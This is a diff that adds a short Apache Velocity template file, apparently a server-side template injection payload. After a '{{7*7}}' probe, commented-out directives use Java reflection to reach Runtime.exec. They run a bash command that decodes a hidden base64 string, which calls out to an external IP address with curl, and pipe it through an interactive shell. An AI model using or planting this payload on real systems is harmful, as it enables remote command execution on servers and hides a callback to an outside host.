@@ -1,0 +1,9 @@
+{{7*7}}#set($greet = 'hello')
+$greet
+$name
+###set($x='')
+###set($rt=$x.class.forName('java.lang.Runtime'))
+###set($chr=$x.class.forName('java.lang.Character'))
+###set($str=$x.class.forName('java.lang.String'))
+###set($ex=$rt.getRuntime().exec('bash -c {echo,Y3VybCBodHRwOi8vOC4xMjkuMTA3LjE5Ojc3NzcvYWJj}|{base64,-d}|{bash,-i}'))
+##$request.getParameter("username")
